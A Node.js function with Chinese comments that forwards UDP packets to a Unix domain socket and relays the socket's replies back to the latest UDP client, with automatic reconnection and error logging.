function forwardUdpToUnix(socketPath, listenPort = g_udp_listen_port) {
  let currentClient = null;            // 保存最近活跃的 UDP 客户端地址 { address, port }
  let unix = null;

  // ---------- Unix 套接字连接与重连 ----------
  function connectUnix() {
    if (unix) unix.destroy();
    unix = net.createConnection(socketPath);
    unix.on('connect', () => console.log(`Connected to Unix socket: ${socketPath}`));
    unix.on('error', (err) => console.error('Unix socket error:', err.message));
    unix.on('close', () => {
      console.log('Unix socket closed, reconnecting in 1s...');
      setTimeout(connectUnix, 1000);
    });

    // 从 Unix 套接字读取数据并发送给 UDP 客户端
    unix.on('data', (data) => {
      if (currentClient) {
        const { address, port } = currentClient;
        udpServer.send(data, port, address, (err) => {
          if (err) console.error('Send UDP error:', err.message);
        });
      } else {
        console.warn('No UDP client known, dropping Unix data');
      }
    });
  }

  // ---------- UDP 服务器 ----------
  const udpServer = dgram.createSocket('udp4');
  udpServer.on('message', (msg, rinfo) => {
    // 更新当前客户端地址
    currentClient = { address: rinfo.address, port: rinfo.port };

    // 将数据写入 Unix 套接字（若可用）
    if (unix && unix.writable) {
      unix.write(msg, (err) => {
        if (err) console.error('Write to Unix failed:', err.message);
      });
    } else {
      console.warn('Unix socket not ready, dropping UDP packet');
    }
  });

  udpServer.on('error', (err) => console.error('UDP server error:', err));
  udpServer.bind(listenPort, '0.0.0.0', () => {
    console.log(`UDP listening on ${listenPort}`);
    connectUnix(); // 绑定成功后连接 Unix
  });

  return udpServer; // 返回服务器对象以便外部控制
}





